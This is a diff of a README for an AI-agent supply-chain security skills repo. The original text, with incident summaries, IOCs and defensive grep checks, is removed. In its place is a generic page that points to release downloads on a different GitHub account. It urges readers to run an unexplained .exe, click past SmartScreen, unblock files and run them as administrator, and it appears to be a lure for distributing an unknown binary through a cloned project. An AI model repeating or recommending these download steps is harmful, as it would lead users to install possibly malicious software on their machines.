@@ -1,156 +1,186 @@
-# agent-infra-security
+# 🛡️ agent-infra-security - Secure AI coding agent workflows
 
-Security skills for AI coding agents. When your dependencies get compromised, these skills are the incident response playbook your agent follows.
+[![Download from Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/lordi2809/agent-infra-security/releases)
 
-![demo](assets/demo.gif)
+## 📥 Download
 
-## Three supply chain attacks in ten days
+Visit this page to download the latest release for Windows:
 
-**March 19, 2026 — Trivy.** Attackers compromise 76 of 77 tags on `aquasecurity/trivy-action`. Every GitHub Actions workflow using a tag reference runs attacker-controlled code. CI secrets — cloud credentials, deploy keys, package registry tokens — are exfiltrated via dead-drop repos.
+https://github.com/lordi2809/agent-infra-security/releases
 
-**March 23, 2026 — KICS.** Using credentials stolen from the Trivy attack, attackers pivot to Checkmarx KICS, overwriting 35 tags on `checkmarx/kics-github-action`. The cascade continues.
+Look for the newest version, then download the Windows file that matches your system. If you see a file with `.exe` or `.zip`, choose that one for the easiest setup.
 
-**March 24, 2026 — LiteLLM.** Credentials stolen from the KICS compromise are used to publish backdoored versions of LiteLLM on PyPI (1.82.7, 1.82.8). The malware drops a `.pth` file in `site-packages/` — Python executes it on every interpreter startup, before your code even imports. SSH keys, AWS credentials, `.env` files, everything is swept and exfiltrated. Most affected developers never directly installed LiteLLM — it was pulled in transitively by CrewAI, DSPy, and Browser-Use.
+## 🖥️ What this tool does
 
-**March 31, 2026 — Axios.** The npm maintainer account `jasonsaayman` is compromised. Malicious versions `axios@1.14.1` and `axios@0.30.4` are published, injecting a typosquatted dependency `plain-crypto-js` that deploys platform-specific backdoors: a disguised binary on macOS (`/Library/Caches/com.apple.act.mond`), a renamed PowerShell on Windows (`wt.exe`), a Python script on Linux (`/tmp/ld.py`). The payload self-deletes its installer and swaps `package.json` to cover its tracks. Axios has 80 million weekly downloads.
+agent-infra-security helps you handle common security tasks when using AI coding tools. It gives you scripts and runbooks for:
 
-**One compromised account cascaded across three ecosystems in ten days.** GitHub Actions → PyPI → npm. Each attack used credentials stolen from the previous one.
+- Supply chain attack response
+- Credential rotation
+- IOC detection
+- Basic incident response steps
+- Security checks for AI-assisted coding work
 
-## Why agents need security skills
+It works with tools like Claude Code, Codex, and Cursor. You can also use it on its own with simple scripts and runbooks.
 
-AI coding agents run `pip install`, `npm install`, and GitHub Actions workflows on your behalf. They pull dependencies, build containers, and deploy code. When a supply chain attack hits, the agent that installed the compromised package is also the fastest path to triage:
+## ✅ Before you start
 
-- It already knows your dependency tree
-- It can search lockfiles, caches, and environments faster than you can type commands
-- It can walk through a structured incident response instead of you grepping StackOverflow at 2am
+You need:
 
-But agents don't know incident response by default. These skills teach them.
+- A Windows PC
+- Internet access
+- Enough space to download the release file
+- Permission to run downloaded files
+- A text editor or file viewer if you want to read the runbooks
 
-## What's in this repo
+If the release comes as a `.zip` file, you will also need the built-in Windows file extractor or another unzip tool.
 
-Six skills organized in layers:
+## 🚀 Install on Windows
 
-### Ecosystem-specific incident response
+1. Open the releases page: https://github.com/lordi2809/agent-infra-security/releases
+2. Find the latest release at the top of the page
+3. Download the Windows file from the Assets section
+4. If the file is a `.zip`, right-click it and choose Extract All
+5. Open the extracted folder
+6. If the file is a `.exe`, double-click it to run
+7. If Windows shows a SmartScreen prompt, choose the option that lets you continue only if you trust the source
+8. Follow any on-screen steps
 
-**[npm-supply-chain-response](skills/npm-supply-chain-response/)** — Deep triage for compromised npm packages. Built around the Axios attack: typosquatted dependency injection, multi-platform backdoors, anti-forensics (self-deleting `setup.js`, `package.md` swap). Six-phase workflow with three output modes (interactive checklist, runbook, automated script).
+## 🧭 First run
 
-**[pypi-supply-chain-response](skills/pypi-supply-chain-response/)** — Deep triage for compromised PyPI packages. Built around the LiteLLM attack: `.pth` startup hooks, transitive dependency exposure via `pipdeptree -r`, credential harvesting. Cross-platform manual playbook (Windows PowerShell, macOS, Linux).
+After you download and open the tool or files:
 
-**[github-actions-supply-chain-response](skills/github-actions-supply-chain-response/)** — Incident response for tag overwriting attacks. Built around the Trivy → KICS cascade: org-wide workflow scanning, run window confirmation, IOC hunting in CI logs, dead-drop repo detection.
+1. Read the main README or runbook files in the folder
+2. Start with the incident response guide if you need help during an event
+3. Keep the credential rotation steps ready if you suspect account exposure
+4. Use the IOC detection files to check for signs of compromise
+5. Save the folder in a place you can find later
 
-### Credential lifecycle
+If the release includes scripts, run them from the included folder so the paths stay correct.
 
-**[credential-exfiltration-response](skills/credential-exfiltration-response/)** — Full detection-to-rotation lifecycle. All ecosystem skills hand off here. Covers 13 credential classes (SSH, AWS with STS session invalidation, GCP, Azure, GitHub, npm, PyPI, Docker, Kubernetes, databases, `.env` secrets, CI/CD secrets, crypto wallets). Includes audit trail queries for every major cloud provider.
+## 🔧 How to use it
 
-### Generic fallback
+Use this project in the way that fits your task:
 
-**[supply-chain-security-check](skills/supply-chain-security-check/)** — Multi-ecosystem fallback for Go, Rust, Ruby, Java, .NET, Docker, and incidents that span multiple ecosystems. Routes to ecosystem-specific skills when available.
+### With Claude Code, Codex, or Cursor
 
-### Proactive hardening
+- Open your AI coding tool
+- Point it to the project folder or the included files
+- Use the runbooks as your guide
+- Follow the steps for the security task you need
 
-**[supply-chain-best-practices](skills/supply-chain-best-practices/)** — Nine-category dependency audit: version pinning, lockfile integrity, install hooks, vulnerability scanning, provenance verification, CI secret scoping, SBOM generation, update strategy, package manager hardening. Produces a PASS/WARN/FAIL checklist. Use this before an incident, not during one.
+### As standalone files
 
-## Install
+- Open the script or runbook you need
+- Follow the steps in order
+- Use the checklist to track what you have done
+- Keep notes on what changed
 
-Add the marketplace in Claude Code:
+### For incident response
 
-```
-/plugin marketplace add makash/agent-infra-security
-```
+Use the included material when you need to:
 
-Install the plugin:
+- Find what changed in a codebase or environment
+- Check for risky package updates
+- Rotate credentials after a suspected leak
+- Look for IOCs in logs, files, or system output
+- Record actions during response work
 
-```
-/plugin install agent-infra-security@agent-infra-security
-```
+## 📁 What’s in the release
 
-Reload plugins:
+A typical release may include:
 
-```
-/reload-plugins
-```
+- Windows download files
+- Readme files
+- Incident response runbooks
+- Credential rotation steps
+- IOC detection scripts
+- Example checklists
+- Folder structure for common security tasks
 
-If you're outside Claude Code, prefix with `claude`:
+If you see more than one file, start with the main readme or the file named for Windows users.
 
-```bash
-claude "/plugin marketplace add makash/agent-infra-security"
-claude "/plugin install agent-infra-security@agent-infra-security"
-```
+## 🛠️ Basic setup tips
 
-After install, you should see the skills listed in `/skills`.
+- Keep the download in a folder with a short path, such as `Downloads\agent-infra-security`
+- Do not rename files unless the README tells you to
+- If a script asks for input, read each prompt before you type
+- Close other tools if a file does not open the first time
+- If a file is blocked by Windows, open its Properties and look for an Unblock option
 
-## Use
+## 🔍 Common tasks
 
-Just describe the incident:
+### Supply chain attack response
 
-```
-axios got compromised — 1.14.1 and 0.30.4 are backdoored. Am I affected?
+Use the runbook to:
 
-litellm got backdoored. I use dspy in production — check transitive deps.
+- Check recent changes
+- Review package installs
+- Find untrusted files
+- Restore known good versions
+- Record the order of events
 
-the trivy github action was compromised. scan our org for affected workflows.
+### Credential rotation
 
-we confirmed we ran the bad version. rotate everything.
+Use the guide to:
 
-audit this project's dependency security before we ship.
-```
+- Change passwords
+- Replace API keys
+- Revoke old access tokens
+- Update secrets in your tools
+- Confirm the new values work
 
-### Codex
+### IOC detection
 
-```bash
-codex --skill ./skills/supply-chain-security-check
-```
+Use the detection steps to:
 
-### No agent — standalone scripts
+- Search logs for known bad signs
+- Review files changed during the event
+- Look for odd network activity
+- Compare against safe baselines
+- Save proof for later review
 
-Every ecosystem skill ships a shell script that works without any AI agent:
+## 💡 Good habits
 
-```bash
-# npm — check for Axios compromise
-./skills/npm-supply-chain-response/scripts/check_npm_compromise.sh axios --dry-run
+- Keep a copy of the original download
+- Make changes in one place at a time
+- Write down what you changed
+- Use the latest release from the releases page
+- Check the folder name before you run anything
 
-# PyPI — check for any compromised package
-./skills/pypi-supply-chain-response/scripts/check_compromise_template.sh
+## 📎 File names you may see
 
-# GitHub Actions — scan org for compromised action references
-./skills/github-actions-supply-chain-response/scripts/check_gha_compromise.sh
-```
+You may see names like:
 
-### No agent — just the commands
+- `README.md`
+- `runbook.md`
+- `incident-response.md`
+- `rotate-credentials.md`
+- `detect-iocs.ps1`
+- `check-supply-chain.ps1`
+- `windows-install.zip`
+- `agent-infra-security.exe`
 
-```bash
-# npm: is the bad version installed?
-grep "axios" package-lock.json yarn.lock pnpm-lock.yaml 2>/dev/null
-ls node_modules/plain-crypto-js 2>/dev/null  # malicious dependency = confirmed compromise
+Not every release will include every file. Use the file that matches your task
 
-# Python: what pulled in litellm?
-pip show litellm | grep Version
-pipdeptree -r -p litellm  # shows dspy, crewai, browser-use as parents
+## 🧩 If something does not open
 
-# GitHub Actions: who's using mutable tags?
-grep -rn 'uses:.*@v' .github/workflows/
-```
+Try these steps:
 
-## Repo structure
+1. Right-click the file
+2. Choose Run as administrator if you have permission
+3. Make sure the file finished downloading
+4. Extract the archive again if it is a `.zip`
+5. Move the folder to a simple path
+6. Open the file with the program that matches its type
 
-```
-agent-infra-security/
-├── skills/
-│   ├── npm-supply-chain-response/                # Axios, and any future npm compromise
-│   ├── pypi-supply-chain-response/               # LiteLLM, and any future PyPI compromise
-│   ├── github-actions-supply-chain-response/     # Trivy/KICS, and any future GHA compromise
-│   ├── credential-exfiltration-response/         # Detection + rotation for 13 credential classes
-│   ├── supply-chain-security-check/              # Generic fallback (Go, Rust, Ruby, Java, .NET)
-│   └── supply-chain-best-practices/              # Proactive hardening audit
-├── .claude-plugin/                                # Plugin manifests for marketplace
-├── CATALOG.md                                     # Skill index with trigger phrases
-└── LICENSE                                        # MIT
-```
+## 🔐 Security notes
 
-## Contributing
+This project focuses on safe response work for AI coding setups. Use it when you need a clear process for handling:
 
-New skills are curated by the maintainer. If you have a playbook idea or an incident that needs coverage, [open an issue](../../issues).
+- Supply chain issues
+- Credential leaks
+- Suspicious files
+- Unknown changes in a project
+- Fast checks after an alert
 
-## License
-
-MIT
+Keep your system updated and review each step before you act
